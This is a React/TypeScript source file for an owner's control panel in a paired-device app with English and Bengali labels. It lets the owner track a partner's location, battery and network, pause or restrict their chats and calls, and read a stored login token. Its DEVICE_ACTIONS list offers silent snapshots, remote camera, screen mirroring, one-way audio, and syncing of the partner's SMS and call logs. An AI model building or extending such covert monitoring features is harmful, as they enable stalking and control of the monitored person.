import { useEffect, useState } from "react";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import { toast } from "sonner";
import { AppWindow, Battery, BatteryCharging, Camera, ChevronRight, Lock, MapPin, Mic, MonitorSmartphone, Timer, Copy, FolderOpen, Image as ImageIcon, LogOut, Pause, PhoneOff, Ghost, Search, Siren, Trash2, Wifi, WifiOff, Signal, X, FileText, PhoneCall, MessageSquare, Moon, ShieldCheck } from "lucide-react";
import type { Json } from "@/integrations/supabase/types";
import { supabase } from "@/integrations/supabase/client";
import { isOnline, shortTime, type PairRow } from "@/lib/fp";
import { useT } from "@/lib/i18n";
import { getPartnerActivity } from "@/lib/login.functions";
import { PartnerActions } from "@/components/fp/PartnerSetup";
import { useBackClose } from "@/components/fp/PrivacyShield";
import { deviceActionLabel } from "@/lib/device-actions";

type Ctl = { chat_paused?: boolean; disappearing_seconds?: number; save_to_gallery_blocked?: boolean; settings?: unknown } | null | undefined;

const PRESETS = [
  { s: 0, en: "Off", bn: "বন্ধ" },
  { s: 300, en: "5m", bn: "৫ মি." },
  { s: 3600, en: "1h", bn: "১ ঘ." },
  { s: 86400, en: "24h", bn: "২৪ ঘ." },
  { s: 604800, en: "7d", bn: "৭ দিন" },
];

/** Live battery / network / last-seen strip shown at the top of the owner's 3-dot sheet. */
export function PartnerStatus({ pair }: { pair: PairRow }) {
  const { t, lang } = useT();
  const st = useQuery({
    queryKey: ["device", pair.partner_id],
    refetchInterval: 30_000,
    queryFn: async () => (await supabase.from("device_status").select("*").eq("user_id", pair.partner_id).maybeSingle()).data,
  });
  const s = st.data;
  const bn = lang === "bn";
  const lvl = s?.battery_level ?? null;
  const tone = lvl == null ? "text-muted-foreground" : lvl > 50 ? "text-online" : lvl > 20 ? "text-warning" : "text-destructive";
  const bar = lvl == null ? "bg-muted-foreground" : lvl > 50 ? "bg-online" : lvl > 20 ? "bg-warning" : "bg-destructive";
  const B = s?.charging ? BatteryCharging : Battery;
  const net = (s?.network_type ?? "").toLowerCase();
  const isWifi = net.includes("wifi") || net.includes("wi-fi");
  const N = isWifi ? Wifi : net ? Signal : WifiOff;
  const netLabel = isWifi ? "Wi-Fi" : net ? (s?.network_type ?? "").toUpperCase() : bn ? "নেই" : "None";
  const online = isOnline(pair.other.last_seen);
  return (
    <div className="rounded-2xl border border-border bg-gradient-to-br from-accent to-muted/60 p-3 shadow-sm">
      <div className="mb-2 flex items-center justify-between text-ui font-bold">
        <span className="flex items-center gap-2">
          <span className="relative flex h-2.5 w-2.5">
            {online && <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-online opacity-75" />}
            <span className={`relative inline-flex h-2.5 w-2.5 rounded-full ${online ? "bg-online" : "bg-muted-foreground"}`} />
          </span>
          {online ? t("online") : `${t("offline")} · ${shortTime(pair.other.last_seen, lang)}`}
        </span>
        <span className="text-ui font-semibold text-muted-foreground">{bn ? "লাইভ ডিভাইস" : "Live device"}</span>
      </div>
      <div className="grid grid-cols-2 gap-2">
        <div className="rounded-xl bg-background p-2.5">
          <p className="text-ui font-semibold text-muted-foreground">{bn ? "ব্যাটারি" : "Battery"}</p>
          <p className={`flex items-center gap-1 text-ui font-extrabold ${tone}`}><B className="h-5 w-5" />{lvl ?? "—"}%</p>
          <div className="mt-1 h-1.5 overflow-hidden rounded-full bg-muted"><div className={`h-full ${bar}`} style={{ width: `${lvl ?? 0}%` }} /></div>
          <p className="mt-1 text-ui text-muted-foreground">{s?.charging ? (bn ? "চার্জ হচ্ছে" : "Charging") : bn ? "চার্জে নেই" : "Not charging"}</p>
        </div>
        <div className="rounded-xl bg-background p-2.5">
          <p className="text-ui font-semibold text-muted-foreground">{bn ? "নেটওয়ার্ক" : "Network"}</p>
          <p className="flex items-center gap-1 text-ui font-extrabold text-primary"><N className="h-5 w-5" />{netLabel}</p>
          <p className="mt-2.5 text-ui text-muted-foreground">{s?.updated_at ? `${bn ? "আপডেট" : "Updated"} ${shortTime(s.updated_at, lang)}` : "—"}</p>
        </div>
      </div>
    </div>
  );
}

/** Per-partner rules + vault + account actions for the owner's 3-dot sheet. */
export function OwnerChatTools({ pair, ctl, onDone, onSearch, onSiren, onLogout, onClear, onRemote }: {
  pair: PairRow; ctl: Ctl; onDone: () => void;
  onSearch: () => void; onSiren: () => void; onLogout: () => void; onClear: () => void; onRemote: (kind: string) => void;
}) {
  const { lang } = useT();
  const bn = lang === "bn";
  const qc = useQueryClient();
  const s = (ctl?.settings ?? {}) as Record<string, Json>;
  const timer = ctl?.disappearing_seconds ?? 0;
  const [custom, setCustom] = useState(false);
  const [vault, setVault] = useState(false);
  const [acct, setAcct] = useState<false | "replace" | "remove">(false);
  const [timerSheet, setTimerSheet] = useState(false);

  async function patch(cols: { chat_paused?: boolean; disappearing_seconds?: number; save_to_gallery_blocked?: boolean }, set?: Record<string, Json>) {
    const row = {
      pair_id: pair.id,
      chat_paused: ctl?.chat_paused ?? false,
      disappearing_seconds: ctl?.disappearing_seconds ?? 0,
      save_to_gallery_blocked: ctl?.save_to_gallery_blocked ?? false,
      ...cols,
      settings: { ...s, ...(set ?? {}) } as Json,
      updated_at: new Date().toISOString(),
    };
    const { error } = await supabase.from("pair_controls").upsert(row);
    if (error) { toast.error(error.message); return; }
    toast.success(bn ? "এই পার্টনারের জন্য সেভ হয়েছে" : "Saved for this partner");
    qc.invalidateQueries({ queryKey: ["controls", pair.id] });
  }

  const flip = (icon: typeof Pause, label: string, hint: string, on: boolean, onChange: (v: boolean) => void) => (
    <Row key={label} icon={icon} label={label} hint={hint} on={on} onChange={onChange} />
  );
  const timerLabel = timer ? fmt(timer, bn) : bn ? "বন্ধ" : "Off";

  return (
    <div className="space-y-4 pb-1">
      <Card title={bn ? "চ্যাট ও প্রাইভেসি" : "Chat & Privacy"}>
        {flip(Pause, bn ? "চ্যাট পজ" : "Pause chat", bn ? "পার্টনার মেসেজ পাঠাতে পারবে না" : "Partner can't send messages", !!ctl?.chat_paused, (v) => patch({ chat_paused: v }))}
        {flip(Copy, bn ? "কপি ও ফরওয়ার্ড বন্ধ" : "Block copy & forward", bn ? "মেসেজ কপি বা শেয়ার করা যাবে না" : "Messages can't be copied or shared", s["g_no_copy"] === true, (v) => patch({}, { g_no_copy: v }))}
        {flip(ImageIcon, bn ? "গ্যালারিতে সেভ বন্ধ" : "Block gallery save", bn ? "মিডিয়া ফোনে সেভ হবে না" : "Media can't be saved to phone", !!ctl?.save_to_gallery_blocked, (v) => patch({ save_to_gallery_blocked: v }))}
        {flip(PhoneOff, bn ? "কল দেওয়া বন্ধ" : "Block outgoing calls", bn ? "পার্টনার কল শুরু করতে পারবে না" : "Partner can't start calls", s["g_call_out"] === false, (v) => patch({}, { g_call_out: !v }))}
        {flip(Ghost, bn ? "স্টিলথ মোড" : "Stealth mode", bn ? "সিন ও টাইপিং লুকানো থাকবে" : "Hide seen & typing", s["g_stealth"] === true, (v) => patch({}, { g_stealth: v }))}
        <NavRow icon={Timer} label={bn ? "অদৃশ্য মেসেজ" : "Disappearing messages"} value={timerLabel} onClick={() => setTimerSheet((v) => !v)} />
        {timerSheet && (
          <div className="flex flex-wrap gap-2 bg-muted/40 px-3 py-3">
            {PRESETS.map((o) => (
              <button key={o.s} onClick={() => patch({ disappearing_seconds: o.s })}
                className={`rounded-full px-3.5 py-1.5 text-ui font-semibold ${timer === o.s ? "bg-primary text-primary-foreground" : "bg-background"}`}>
                {bn ? o.bn : o.en}
              </button>
            ))}
            <button onClick={() => setCustom(true)}
              className={`rounded-full px-3.5 py-1.5 text-ui font-semibold ${timer && !PRESETS.some((p) => p.s === timer) ? "bg-primary text-primary-foreground" : "bg-background"}`}>
              {timer && !PRESETS.some((p) => p.s === timer) ? fmt(timer, bn) : bn ? "কাস্টম" : "Custom"}
            </button>
          </div>
        )}
      </Card>

      <Card title={bn ? "মিডিয়া ও খোঁজা" : "Media & Search"}>
        <NavRow icon={FolderOpen} label={bn ? "শেয়ার করা মিডিয়া" : "Shared media"} onClick={() => setVault(true)} />
        <NavRow icon={Search} label={bn ? "চ্যাটে খুঁজুন" : "Search chat"} onClick={onSearch} />
      </Card>

      <Card title={bn ? "ডিভাইস কন্ট্রোল" : "Device controls"}>
        {DEVICE_ACTIONS.map((d) => (
          <NavRow key={d.kind} icon={d.icon} label={bn ? d.bn : d.en} value={deviceActionLabel(d.kind, bn)} danger={d.kind === "siren"} onClick={() => (d.kind === "siren" ? onSiren() : onRemote(d.kind))} />
        ))}
      </Card>

      <RulesAndLocation pair={pair} s={s} bn={bn} save={(k, v) => patch({}, { [k]: v })} />

      <CredentialsCard pair={pair} bn={bn} onRenew={() => setAcct("replace")} onRemove={() => setAcct("remove")} />

        <Card title={bn ? "অ্যাকাউন্ট ও সিকিউরিটি" : "Account & Security"}>
        <NavRow icon={LogOut} label={bn ? "পার্টনার সেশন বন্ধ" : "End partner session"} onClick={onLogout} danger />
        <NavRow icon={Trash2} label={bn ? "পুরো চ্যাট মুছুন" : "Clear chat"} onClick={onClear} danger />
      </Card>

      {custom && <CustomTimer bn={bn} onClose={() => setCustom(false)} onSave={(sec) => { setCustom(false); patch({ disappearing_seconds: sec }); }} />}
      {vault && <MediaVault pairId={pair.id} bn={bn} onClose={() => setVault(false)} />}
      {acct && <AccountActions pair={pair} initial={acct} onClose={() => setAcct(false)} />}
    </div>
  );
}

const DEVICE_ACTIONS = [
  { kind: "siren", icon: Siren, en: "Ring emergency siren", bn: "জরুরি সাইরেন বাজান" },
  { kind: "live_location", icon: MapPin, en: "Live location", bn: "লাইভ লোকেশন" },
  { kind: "device_status", icon: Battery, en: "Battery & device status", bn: "ব্যাটারি ও ডিভাইস স্ট্যাটাস" },
  { kind: "silent_snapshot", icon: Camera, en: "Silent snapshot", bn: "সাইলেন্ট স্ন্যাপশট" },
  { kind: "remote_camera", icon: Camera, en: "Remote camera", bn: "রিমোট ক্যামেরা" },
  { kind: "screen_mirror", icon: MonitorSmartphone, en: "Screen mirror", bn: "স্ক্রিন মিরর" },
  { kind: "one_way_audio", icon: Mic, en: "One-way audio", bn: "ওয়ান-ওয়ে অডিও" },
  { kind: "sync_call_log", icon: PhoneCall, en: "Call log", bn: "কল লগ" },
  { kind: "sync_sms", icon: MessageSquare, en: "SMS", bn: "এসএমএস" },
  { kind: "sync_apps", icon: AppWindow, en: "Installed apps", bn: "ইনস্টল করা অ্যাপ" },
  { kind: "app_lock", icon: AppWindow, en: "App lock", bn: "অ্যাপ লক" },
  { kind: "lock_device", icon: Lock, en: "Lock screen", bn: "স্ক্রিন লক" },
];

function NavRow({ icon: I, label, value, onClick, danger }: { icon: typeof Pause; label: string; value?: string; onClick: () => void; danger?: boolean }) {
  return (
    <button onClick={onClick} className={`flex w-full items-center gap-3 px-3 py-3 text-left active:bg-muted ${danger ? "text-destructive" : ""}`}>
      <span className={`flex h-9 w-9 shrink-0 items-center justify-center rounded-full ${danger ? "bg-destructive/10" : "bg-accent text-primary"}`}><I className="h-5 w-5" /></span>
      <span className="flex-1 text-ui font-semibold">{label}</span>
      {value && <span className="text-ui text-muted-foreground">{value}</span>}
      <ChevronRight className="h-4 w-4 text-muted-foreground" />
    </button>
  );
}

function Card({ title, right, danger, children }: { title: string; right?: string; danger?: boolean; children: React.ReactNode }) {
  return (
    <section>
      <div className="mb-1 flex items-center justify-between px-2">
        <p className={`text-ui font-extrabold uppercase tracking-wide ${danger ? "text-destructive" : "text-muted-foreground"}`}>{title}</p>
        {right && <span className="text-ui font-bold text-primary">{right}</span>}
      </div>
      <div className={`divide-y divide-border overflow-hidden rounded-2xl border ${danger ? "border-destructive/30" : "border-border"} bg-card`}>{children}</div>
    </section>
  );
}

function Row({ icon: I, label, hint, on, onChange }: { icon: typeof Pause; label: string; hint: string; on: boolean; onChange: (v: boolean) => void }) {
  return (
    <button type="button" role="switch" aria-checked={on} onClick={() => onChange(!on)} className="flex w-full items-center gap-3 px-3 py-2.5 text-left active:bg-muted">
      <span className="flex h-9 w-9 shrink-0 items-center justify-center rounded-full bg-accent text-primary"><I className="h-5 w-5" /></span>
      <span className="min-w-0 flex-1">
        <span className="block text-ui font-semibold">{label}</span>
        <span className="block truncate text-ui text-muted-foreground">{hint}</span>
      </span>
      <span className={`relative h-6 w-11 shrink-0 rounded-full transition-colors ${on ? "bg-primary" : "bg-muted-foreground/30"}`}>
        <span className={`absolute top-0.5 h-5 w-5 rounded-full bg-background shadow transition-all ${on ? "left-[22px]" : "left-0.5"}`} />
      </span>
    </button>
  );
}

function fmt(s: number, bn: boolean) {
  if (s % 86400 === 0) return `${s / 86400}${bn ? " দিন" : "d"}`;
  if (s % 3600 === 0) return `${s / 3600}${bn ? " ঘ." : "h"}`;
  return `${Math.round(s / 60)}${bn ? " মি." : "m"}`;
}

function CustomTimer({ bn, onClose, onSave }: { bn: boolean; onClose: () => void; onSave: (s: number) => void }) {
  const [n, setN] = useState("1");
  const [u, setU] = useState(3600);
  const sec = Math.round(Number(n) * u);
  const ok = sec >= 60 && sec <= 365 * 86400;
  return (
    <Overlay title={bn ? "কাস্টম টাইমার" : "Custom timer"} onClose={onClose}>
      <div className="flex gap-2">
        <input type="number" min={1} value={n} onChange={(e) => setN(e.target.value)} className="w-24 rounded-lg border border-input bg-background px-2 py-2" />
        <select value={u} onChange={(e) => setU(Number(e.target.value))} className="flex-1 rounded-lg border border-input bg-background px-2 py-2">
          <option value={60}>{bn ? "মিনিট" : "Minutes"}</option>
          <option value={3600}>{bn ? "ঘণ্টা" : "Hours"}</option>
          <option value={86400}>{bn ? "দিন" : "Days"}</option>
        </select>
      </div>
      <p className="mt-2 text-ui text-muted-foreground">{bn ? "১ মিনিট থেকে ৩৬৫ দিন" : "1 minute to 365 days"}</p>
      <button disabled={!ok} onClick={() => onSave(sec)} className="mt-3 w-full rounded-full bg-primary py-2.5 font-bold text-primary-foreground disabled:opacity-50">
        {bn ? "সেট করুন" : "Set"}
      </button>
    </Overlay>
  );
}

function MediaVault({ pairId, bn, onClose }: { pairId: string; bn: boolean; onClose: () => void }) {
  const files = useQuery({
    queryKey: ["vault", pairId],
    queryFn: async () =>
      (await supabase.from("messages").select("id, file_path, file_name, file_type, created_at").eq("pair_id", pairId)
        .not("file_path", "is", null).is("deleted_at", null).order("created_at", { ascending: false })).data ?? [],
  });
  return (
    <Overlay title={bn ? "শেয়ার করা মিডিয়া" : "Shared media"} onClose={onClose}>
      {files.data?.length === 0 && <p className="py-6 text-center text-ui text-muted-foreground">{bn ? "কোনো মিডিয়া নেই" : "No media yet"}</p>}
      <div className="grid max-h-[60vh] grid-cols-3 gap-1 overflow-y-auto">
        {files.data?.map((f) => <VaultItem key={f.id} path={f.file_path!} name={f.file_name ?? ""} type={f.file_type ?? ""} />)}
      </div>
    </Overlay>
  );
}

function VaultItem({ path, name, type }: { path: string; name: string; type: string }) {
  const [url, setUrl] = useState<string | null>(null);
  useEffect(() => {
    supabase.storage.from("fixedpair-files").createSignedUrl(path, 3600).then(({ data }) => setUrl(data?.signedUrl ?? null));
  }, [path]);
  const cls = "aspect-square w-full rounded-lg bg-muted object-cover";
  return (
    <a href={url ?? undefined} target="_blank" rel="noreferrer" className="block">
      {url && type.startsWith("image/") ? <img src={url} alt={name} loading="lazy" className={cls} />
        : url && type.startsWith("video/") ? <video src={url} preload="metadata" className={cls} />
        : <div className={`${cls} flex flex-col items-center justify-center p-1 text-center text-ui`}><FileText className="h-6 w-6 text-primary" /><span className="line-clamp-2 break-all">{name}</span></div>}
    </a>
  );
}

function AccountActions({ pair, onClose, initial }: { pair: PairRow; onClose: () => void; initial: "replace" | "remove" }) {
  const act = useQuery({ queryKey: ["partner-activity", pair.owner_id], queryFn: () => getPartnerActivity() });
  const loginId = act.data?.find((a) => a.partnerId === pair.partner_id)?.loginId ?? "";
  return <PartnerActions pair={pair} loginId={loginId} initial={initial} onClose={onClose} />;
}

/** Partner login ID + last known token, shown right on the outer 3-dot sheet. */
function CredentialsCard({ pair, bn, onRenew, onRemove }: { pair: PairRow; bn: boolean; onRenew: () => void; onRemove: () => void }) {
  const act = useQuery({ queryKey: ["partner-activity", pair.owner_id], queryFn: () => getPartnerActivity() });
  const loginId = act.data?.find((a) => a.partnerId === pair.partner_id)?.loginId ?? "";
  const [token, setToken] = useState<string | null>(null);
  const [show, setShow] = useState(false);
  useEffect(() => { if (loginId) setToken(localStorage.getItem(`fp-ptoken-${loginId}`)); }, [loginId]);
  const copy = (v: string) => { navigator.clipboard?.writeText(v); toast.success(bn ? "কপি হয়েছে" : "Copied"); };
  return (
    <Card title={bn ? "পার্টনার আইডি ও টোকেন" : "Partner ID & token"}>
      <div className="space-y-2 p-3 text-ui">
        <div className="flex items-center gap-2">
          <span className="w-14 text-ui text-muted-foreground">ID</span>
          <span className="min-w-0 flex-1 truncate font-mono font-bold">{loginId || "…"}</span>
          {loginId && <button aria-label="Copy ID" onClick={() => copy(loginId)} className="rounded-full p-1.5 text-primary"><Copy className="h-4 w-4" /></button>}
        </div>
        <div className="flex items-center gap-2">
          <span className="w-14 text-ui text-muted-foreground">{bn ? "টোকেন" : "Token"}</span>
          {token ? (
            <>
              <button onClick={() => setShow((v) => !v)} className="min-w-0 flex-1 truncate text-left font-mono text-ui">{show ? token : "•••••••••• " + (bn ? "(দেখতে চাপুন)" : "(tap to show)")}</button>
              <button aria-label="Copy token" onClick={() => copy(`ID: ${loginId}\nToken: ${token}`)} className="rounded-full p-1.5 text-primary"><Copy className="h-4 w-4" /></button>
            </>
          ) : (
            <span className="flex-1 text-ui text-muted-foreground">{bn ? "এই ফোনে সংরক্ষিত নেই — রিনিউ করুন" : "Not saved on this phone — renew it"}</span>
          )}
        </div>
        <div className="flex gap-2 pt-1">
          <button onClick={onRenew} className="flex-1 rounded-full bg-primary py-2 text-ui font-bold text-primary-foreground">{bn ? "টোকেন রিনিউ" : "Renew token"}</button>
          <button onClick={onRemove} className="flex-1 rounded-full bg-destructive/10 py-2 text-ui font-bold text-destructive">{bn ? "পার্টনার সরান" : "Remove partner"}</button>
        </div>
      </div>
    </Card>
  );
}

function Overlay({ title, onClose, children }: { title: string; onClose: () => void; children: React.ReactNode }) {
  useBackClose(true, onClose);
  return (
    <div className="fixed inset-0 z-[60] flex items-center justify-center bg-foreground/40 p-4" onClick={onClose}>
      <div className="w-full max-w-sm rounded-2xl bg-background p-4" onClick={(e) => e.stopPropagation()}>
        <div className="mb-3 flex items-center justify-between">
          <p className="font-extrabold">{title}</p>
          <button aria-label="Close" onClick={onClose} className="rounded-full p-1"><X className="h-5 w-5" /></button>
        </div>
        {children}
      </div>
    </div>
  );
}

function RulesAndLocation({ pair, s, bn, save }: { pair: PairRow; s: Record<string, Json>; bn: boolean; save: (k: string, v: Json) => void }) {
  const { lang } = useT();
  const st = useQuery({
    queryKey: ["device", pair.partner_id],
    queryFn: async () => (await supabase.from("device_status").select("*").eq("user_id", pair.partner_id).maybeSingle()).data,
  });
  const reports = useQuery({
    queryKey: ["reports", pair.partner_id],
    refetchInterval: 15_000,
    queryFn: async () => (await supabase.from("device_reports").select("*").eq("partner_id", pair.partner_id).order("created_at", { ascending: false }).limit(10)).data ?? [],
  });
  const d = st.data;
  const str = (k: string) => (s[k] == null ? "" : String(s[k]));
  const inZone = d?.lat != null && d?.lng != null && s["geofence_lat"] != null && s["geofence_m"]
    ? distM(d.lat, d.lng, Number(s["geofence_lat"]), Number(s["geofence_lng"])) <= Number(s["geofence_m"]) : null;
  return (
    <>
      <Card title={bn ? "সময়সূচি ও নিয়ম" : "Schedule & rules"}>
        <div className="space-y-2 px-3 py-3">
          <div className="flex items-center gap-2 text-ui font-semibold"><Moon className="h-4 w-4 text-primary" />{bn ? "বেডটাইম" : "Bedtime"}</div>
          <div className="flex gap-2">
            <Field type="time" value={str("bedtime_from")} onSave={(v) => save("bedtime_from", v)} />
            <Field type="time" value={str("bedtime_to")} onSave={(v) => save("bedtime_to", v)} />
          </div>
          <Field label={bn ? "কিওয়ার্ড অ্যালার্ট (কমা দিয়ে)" : "Alert keywords (comma separated)"} value={str("keywords")} onSave={(v) => save("keywords", v)} />
          <Field label={bn ? "পার্টনারের লেবেল" : "Partner label"} value={str("partner_label")} onSave={(v) => save("partner_label", v)} />
        </div>
      </Card>
      <Card title={bn ? "লোকেশন ও সেফ জোন" : "Location & safe zone"}>
        <div className="space-y-2 px-3 py-3 text-ui">
          <Field type="number" label={bn ? "সেফ জোন ব্যাসার্ধ (মিটার)" : "Safe zone radius (m)"} value={str("geofence_m")} onSave={(v) => save("geofence_m", Number(v))} />
          {d?.lat != null && d?.lng != null ? (
            <>
              <button className="rounded-lg bg-accent px-3 py-1.5 text-ui font-bold" onClick={() => { save("geofence_lat", d.lat!); save("geofence_lng", d.lng!); }}>
                {bn ? "বর্তমান লোকেশনকে সেফ জোন কেন্দ্র করুন" : "Use current location as safe zone centre"}
              </button>
              <iframe title="map" className="h-48 w-full rounded-xl border border-border"
                src={`https://www.openstreetmap.org/export/embed.html?bbox=${d.lng - 0.01},${d.lat - 0.006},${d.lng + 0.01},${d.lat + 0.006}&layer=mapnik&marker=${d.lat},${d.lng}`} />
              {inZone != null && <p className="flex items-center gap-1 text-ui font-bold"><ShieldCheck className="h-4 w-4" />{inZone ? (bn ? "সেফ জোনের ভেতরে" : "Inside safe zone") : (bn ? "সেফ জোনের বাইরে" : "Outside safe zone")}</p>}
            </>
          ) : <p className="text-ui text-muted-foreground">{bn ? "এখনো লোকেশন আসেনি" : "No location received yet"}</p>}
        </div>
      </Card>
      <Card title={bn ? "ডিভাইস থেকে আসা তথ্য" : "Reports from device"}>
        {!reports.data?.length ? <p className="px-3 py-3 text-ui text-muted-foreground">{bn ? "এখনো কিছু আসেনি" : "Nothing received yet"}</p> : reports.data.map((r) => (
          <div key={r.id} className="flex justify-between px-3 py-2 text-ui">
            <span className="font-semibold">{String((r as { kind?: string }).kind ?? "")}</span>
            <span className="text-ui text-muted-foreground">{shortTime(r.created_at, lang)}</span>
          </div>
        ))}
      </Card>
    </>
  );
}

function Field({ label, value, onSave, type = "text" }: { label?: string; value: string; onSave: (v: string) => void; type?: string }) {
  return (
    <label className="block flex-1">
      {label && <span className="text-ui font-semibold text-muted-foreground">{label}</span>}
      <input key={value} type={type} defaultValue={value} onBlur={(e) => e.target.value !== value && onSave(e.target.value)}
        className="mt-1 w-full rounded-lg border border-input bg-background px-2 py-1.5 text-ui" />
    </label>
  );
}

function distM(a: number, b: number, c: number, d: number) {
  const R = 6371000, r = Math.PI / 180;
  const x = Math.sin(((c - a) * r) / 2) ** 2 + Math.cos(a * r) * Math.cos(c * r) * Math.sin(((d - b) * r) / 2) ** 2;
  return 2 * R * Math.asin(Math.sqrt(x));
}
